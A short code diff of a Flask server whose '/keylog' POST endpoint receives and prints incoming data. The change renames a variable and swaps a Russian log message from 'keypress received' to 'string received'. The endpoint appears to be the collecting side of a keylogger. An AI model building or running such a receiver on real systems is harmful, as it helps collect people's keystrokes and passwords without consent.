@@ -4,8 +4,8 @@ app = Flask(__name__)
 
 @app.route('/keylog', methods=['POST'])
 def keylog():
-    key = request.data.decode('utf-8')
-    print(f"Получено нажатие: {key}")
+    data = request.data.decode('utf-8')
+    print(f"Полученная строка: {data}")
     return 'OK'
 
 if __name__ == '__main__':
